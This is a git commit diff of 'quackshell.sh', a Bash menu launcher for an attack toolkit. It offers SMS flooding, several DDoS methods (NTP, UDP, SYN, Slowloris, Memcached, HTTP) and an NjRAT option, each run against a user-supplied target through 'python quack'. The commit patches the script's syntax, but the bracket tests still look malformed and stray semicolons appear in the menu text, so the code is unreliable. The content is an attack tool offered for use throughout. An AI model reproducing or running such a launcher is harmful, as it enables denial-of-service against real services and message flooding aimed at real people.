5e7f2a838958770b475c7e7cb7bd0f605bfbcf38
White Phoenix <whitephoenixofc@users.noreply.github.com>
2021-01-09 05:14:22 -0600

    Update quackshell.sh

--- quackshell.sh
+++ quackshell.sh
@@ -33,40 +33,40 @@ echo -e "${green}
 
              Quackshell Options:        
    
-${green}[${yellow}01${green}] ${white}SMS Attack              ${green}[${yellow}06${green}] ${white}POD Attack
-${green}[${yellow}02${green}] ${white}NTP Attack              ${green}[${yellow}07${green}] ${white}Slowloris 
-${green}[${yellow}03${green}] ${white}TCP Attack              ${green}[${yellow}08${green}] ${white}Memcached 
-${green}[${yellow}04${green}] ${white}UDP Attack              ${green}[${yellow}09${green}] ${white}HTTP DDoS 
-${green}[${yellow}05${green}] ${white}SYN Attack              ${green}[${yellow}10${green}] ${white}NjRAT    
+${green}[${yellow}01${green}]; ${white}SMS Attack              ${green}[${yellow}06${green}]; ${white}POD Attack
+${green}[${yellow}02${green}]; ${white}NTP Attack              ${green}[${yellow}07${green}]; ${white}Slowloris 
+${green}[${yellow}03${green}]; ${white}TCP Attack              ${green}[${yellow}08${green}]; ${white}Memcached 
+${green}[${yellow}04${green}]; ${white}UDP Attack              ${green}[${yellow}09${green}]; ${white}HTTP DDoS 
+${green}[${yellow}05${green}]; ${white}SYN Attack              ${green}[${yellow}10${green}]; ${white}NjRAT    
  
 "${white}
 read -p 'Select option: ' option
-if ["$option" == "01"] then
+if ["$option" == "01"]; then
 quacksms
-elif ["$option" == "02"] then
+elif ["$option" == "02"]; then
 quacktype="NTP"
 quackip
-elif ["$option" == "03"] then
+elif ["$option" == "03"]; then
 quacktype="TCP"
 quackip
-elif ["$option" == "04"] then
+elif ["$option" == "04"]; then
 quacktype="UDP"
 quackip
-elif ["$option" == "05"] then
+elif ["$option" == "05"]; then
 quacktype="SYN"
 quackip
-elif ["$option" == "06"] then
+elif ["$option" == "06"]; then
 quacktype="POD"
 quackip
-elif ["$option" == "07"] then
+elif ["$option" == "07"]; then
 quacktype="SLOWLORIS"
 quackip
-elif ["$option" == "08"] then
+elif ["$option" == "08"]; then
 quacktype="MEMCACHED"
 quackip
-elif ["$option" == "09"] then
+elif ["$option" == "09"]; then
 quackhttp
-elif ["$option" == "10"] then
+elif ["$option" == "10"]; then
 quacktype="NJRAT"
 quackip
 else echo -e "${red}Invalid option"${white}
@@ -90,7 +90,7 @@ ${green}Target: ${yellow}${target}${green}, Timeout: ${yellow}${timeout}${green}
 
 ${white}Continue? y/N - "${yellow} continue
 
-if [$continue == y || $continue == Y] then
+if [$continue == y || $continue == Y]; then
 cd core
 python quack --tool SMS --target ${target} --timeout ${timeout} --threads ${threads}
 cd
@@ -112,7 +112,7 @@ ${green}Target: ${yellow}${target}${green}, Timeout: ${yellow}${timeout}${green}
 
 ${white}Continue? y/N - "${yellow} continue
 
-if [$continue == y || $continue == Y] then
+if [$continue == y || $continue == Y]; then
 cd core
 python quack --tool ${quacktype} --target ${target} --timeout ${timeout} --threads ${threads}
 cd
@@ -134,7 +134,7 @@ ${green}Target: ${yellow}${target}${green}, Timeout: ${yellow}${timeout}${green}
 
 ${white}Continue? y/N - "${yellow} continue
 
-if [$continue == y || $continue == Y] then
+if [$continue == y || $continue == Y]; then
 cd core
 python quack --tool HTTP --target ${target} --timeout ${timeout} --threads ${threads}
 cd
